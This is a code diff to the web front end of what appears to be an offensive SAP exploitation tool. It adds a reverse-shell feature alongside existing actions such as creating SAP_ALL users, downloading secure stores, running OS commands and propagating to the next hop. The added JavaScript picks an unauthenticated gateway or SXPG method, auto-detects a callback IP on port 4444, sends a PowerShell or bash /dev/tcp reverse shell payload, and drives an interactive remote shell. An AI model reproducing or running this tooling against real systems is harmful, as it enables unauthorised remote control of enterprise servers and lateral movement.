@@ -444,6 +444,7 @@ body {
       <div class="ctx-item" data-action="create_user_creds">&#128100; Create User (Credentials)</div>
       <div class="ctx-item" data-action="create_tcpip">&#128279; Create TCP/IP Dest (sapxpg)</div>
       <div class="ctx-item" data-action="os_terminal">&#128187; OS Command Terminal</div>
+      <div class="ctx-item" data-action="reverse_shell">&#128279; Reverse Shell</div>
       <div class="ctx-sep"></div>
       <div class="ctx-item" data-action="propagate">&#128640; Propagate (exploit next hop)</div>
     </div>
@@ -762,6 +763,51 @@ body {
     <div class="form-actions" style="margin-top:8px">
       <button class="btn" onclick="document.getElementById('term-output').textContent=''">Clear</button>
       <button class="btn" onclick="closeModal('terminal-modal')">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- Reverse Shell Modal -->
+<div class="modal-overlay" id="shell-modal">
+  <div class="modal" style="width:660px;max-width:92vw">
+    <h3>&#128279; Reverse Shell — <span id="shell-sid"></span></h3>
+    <div id="shell-config">
+      <div style="font-size:11px;color:#8b949e;margin-bottom:8px" id="shell-info"></div>
+      <div style="display:flex;gap:8px;margin-bottom:8px">
+        <div style="flex:1">
+          <label style="font-size:11px;color:#8b949e">Method</label>
+          <select id="shell-method" style="width:100%">
+            <option value="gateway">Gateway (unauthenticated)</option>
+            <option value="sxpg">SXPG (via SAP_ALL user)</option>
+          </select>
+        </div>
+        <div style="flex:1">
+          <label style="font-size:11px;color:#8b949e">Callback IP</label>
+          <input type="text" id="shell-ip" placeholder="auto-detecting..." style="width:100%">
+        </div>
+        <div style="width:80px">
+          <label style="font-size:11px;color:#8b949e">Port</label>
+          <input type="text" id="shell-port" value="4444" style="width:100%">
+        </div>
+      </div>
+      <div style="font-size:10px;color:#484f58;margin-bottom:8px" id="shell-payload-preview"></div>
+      <button class="btn btn-primary" onclick="shellStart()" style="width:100%">&#9654; Start Listener &amp; Send Payload</button>
+    </div>
+    <div id="shell-status-bar" style="display:none;padding:6px 0;font-size:12px">
+      <span id="shell-status-dot" style="display:inline-block;width:10px;height:10px;border-radius:50%;background:#484f58;margin-right:6px;vertical-align:middle"></span>
+      <span id="shell-status-text">Idle</span>
+    </div>
+    <div id="shell-terminal" style="display:none;background:#010409;border:1px solid #30363d;border-radius:4px;
+      padding:8px;margin-top:4px;font-family:monospace;font-size:12px;color:#7ee787;
+      min-height:200px;max-height:450px;overflow-y:auto;white-space:pre-wrap;word-break:break-all"></div>
+    <div id="shell-input-bar" style="display:none;margin-top:4px;display:flex;gap:4px">
+      <input type="text" id="shell-input" placeholder="Type command..." style="flex:1;font-family:monospace"
+             disabled onkeydown="if(event.key==='Enter'){event.preventDefault();shellSendInput();}">
+      <button class="btn" onclick="shellSendInput()" id="shell-send-btn" disabled>Send</button>
+    </div>
+    <div class="form-actions" style="margin-top:8px">
+      <button class="btn btn-danger" onclick="shellStop()" id="shell-stop-btn" style="display:none">&#9724; Stop</button>
+      <button class="btn" onclick="shellClose()">Close</button>
     </div>
   </div>
 </div>
@@ -1483,6 +1529,7 @@ function showCtxMenu(e, sid) {
     'download_secstore':  hasCreds,                   // need credentials/access
     'download_table':     hasCreds,                   // need credentials/access
     'os_terminal':      hasGwVuln || hasCreatedUsers, // need GW vuln or created user
+    'reverse_shell':    hasGwVuln || hasCreatedUsers, // need GW vuln or created user
     'create_tcpip':     hasCreds,                   // need credentials/access
     'propagate':        hasCreds,                   // need access to propagate from
     'cleanup':          hasCreatedUsers,             // need created users to clean up
@@ -1510,6 +1557,7 @@ function showCtxMenu(e, sid) {
     'download_secstore':  'Provide credentials or create a user first',
     'download_table':     'Provide credentials or create a user first',
     'os_terminal':      'Requires vulnerable gateway or created user with SAP_ALL',
+    'reverse_shell':    'Requires vulnerable gateway or created user with SAP_ALL',
     'create_tcpip':     'Provide credentials or create a user first',
     'propagate':        'Provide credentials or create a user first',
     'cleanup':          'No created users to clean up',
@@ -1617,6 +1665,7 @@ async function ctxAction(action) {
     case 'download_table':
       document.getElementById('table-modal').classList.add('visible'); break;
     case 'os_terminal': showTerminalModal(sid); break;
+    case 'reverse_shell': showShellModal(sid); break;
     case 'create_tcpip': showTcpipModal(sid); break;
     case 'propagate': showPropagateModal(sid); break;
     case 'cleanup':
@@ -2224,6 +2273,154 @@ async function termExec() {
     out.textContent += `ERROR: ${e}\n`;
   }
   out.scrollTop = out.scrollHeight;
+}
+
+// --- Reverse Shell ---
+let _shellPollId = null;
+let _shellSid = '';
+
+async function showShellModal(sid) {
+  _shellSid = sid;
+  const n = (mapState.nodes || {})[sid];
+  document.getElementById('shell-sid').textContent = sid;
+
+  // Method availability
+  const hasGw = n && n.gw_vulnerable;
+  const hasCreated = n && (n.created_users || []).length > 0;
+  const methodSel = document.getElementById('shell-method');
+  methodSel.options[0].disabled = !hasGw;
+  methodSel.options[1].disabled = !hasCreated;
+  methodSel.value = hasGw ? 'gateway' : 'sxpg';
+
+  let info = [];
+  if (hasGw) info.push('Gateway: vulnerable');
+  if (hasCreated) info.push('SXPG: user available');
+  document.getElementById('shell-info').textContent = info.join(' | ');
+
+  // Auto-detect callback IP
+  const host = n ? (n.ip || n.hostname) : '';
+  const saprouter = n ? (n.saprouter || '') : '';
+  document.getElementById('shell-ip').value = 'detecting...';
+  const ipRes = await api('GET', `shell/detect_ip?target=${encodeURIComponent(host)}&saprouter=${encodeURIComponent(saprouter)}`);
+  document.getElementById('shell-ip').value = ipRes.local_ip || '127.0.0.1';
+
+  // Payload preview
+  const os = (n && n.os_type || '').toLowerCase();
+  const isWin = os.includes('windows') || os.includes('nt');
+  document.getElementById('shell-payload-preview').textContent =
+    isWin ? 'Payload: PowerShell TCPClient reverse shell (Windows detected)'
+          : 'Payload: bash /dev/tcp reverse shell (Linux detected)';
+
+  // Reset UI state
+  document.getElementById('shell-config').style.display = '';
+  document.getElementById('shell-status-bar').style.display = 'none';
+  document.getElementById('shell-terminal').style.display = 'none';
+  document.getElementById('shell-terminal').textContent = '';
+  document.getElementById('shell-input-bar').style.display = 'none';
+  document.getElementById('shell-stop-btn').style.display = 'none';
+  document.getElementById('shell-input').disabled = true;
+  document.getElementById('shell-send-btn').disabled = true;
+
+  document.getElementById('shell-modal').classList.add('visible');
+}
+
+function shellSetStatus(state, text) {
+  const dot = document.getElementById('shell-status-dot');
+  const txt = document.getElementById('shell-status-text');
+  const colors = {waiting:'#d29922', connected:'#3fb950', disconnected:'#f85149', error:'#f85149'};
+  dot.style.background = colors[state] || '#484f58';
+  txt.textContent = text;
+}
+
+async function shellStart() {
+  const sid = _shellSid;
+  const method = document.getElementById('shell-method').value;
+  const localIp = document.getElementById('shell-ip').value.trim();
+  const port = parseInt(document.getElementById('shell-port').value) || 4444;
+
+  if (!localIp) { alert('Callback IP is required'); return; }
+
+  const res = await api('POST', 'shell/start', {
+    sid, method, listen_port: port, local_ip: localIp
+  });
+  if (res.error) { alert(res.error); return; }
+
+  // Switch to shell view
+  document.getElementById('shell-config').style.display = 'none';
+  document.getElementById('shell-status-bar').style.display = '';
+  document.getElementById('shell-terminal').style.display = '';
+  document.getElementById('shell-input-bar').style.display = 'flex';
+  document.getElementById('shell-stop-btn').style.display = '';
+  shellSetStatus('waiting', `Listening on 0.0.0.0:${port} — waiting for connection...`);
+  document.getElementById('shell-terminal').textContent =
+    `[*] Reverse shell listener started on port ${port}\n[*] Payload sent to ${sid} — waiting for callback...\n`;
+
+  // Start polling
+  shellStartPolling();
+}
+
+function shellStartPolling() {
+  if (_shellPollId) clearInterval(_shellPollId);
+  _shellPollId = setInterval(async () => {
+    // Poll status
+    const st = await api('GET', 'shell/status');
+    if (!st.active) {
+      shellSetStatus('disconnected', 'Session ended');
+      shellStopPolling();
+      return;
+    }
+    if (st.status === 'connected') {
+      shellSetStatus('connected', `Connected from ${st.client_addr}`);
+      document.getElementById('shell-input').disabled = false;
+      document.getElementById('shell-send-btn').disabled = false;
+      document.getElementById('shell-input').focus();
+    } else if (st.status === 'error') {
+      shellSetStatus('error', st.error || 'Error');
+      shellStopPolling();
+      return;
+    } else if (st.status === 'disconnected') {
+      shellSetStatus('disconnected', 'Shell disconnected');
+      document.getElementById('shell-input').disabled = true;
+      document.getElementById('shell-send-btn').disabled = true;
+      shellStopPolling();
+      return;
+    }
+
+    // Poll output
+    const out = await api('GET', 'shell/output');
+    if (out.output) {
+      const term = document.getElementById('shell-terminal');
+      term.textContent += out.output;
+      term.scrollTop = term.scrollHeight;
+    }
+  }, 200);
+}
+
+function shellStopPolling() {
+  if (_shellPollId) { clearInterval(_shellPollId); _shellPollId = null; }
+}
+
+async function shellSendInput() {
+  const input = document.getElementById('shell-input');
+  const text = input.value;
+  if (!text) return;
+  input.value = '';
+  await api('POST', 'shell/input', { text });
+}
+
+async function shellStop() {
+  shellStopPolling();
+  await api('POST', 'shell/stop');
+  shellSetStatus('disconnected', 'Stopped');
+  document.getElementById('shell-input').disabled = true;
+  document.getElementById('shell-send-btn').disabled = true;
+  // Re-show config for potential restart
+  document.getElementById('shell-config').style.display = '';
+}
+
+function shellClose() {
+  shellStop();
+  closeModal('shell-modal');
 }
 
 // --- Global actions ---
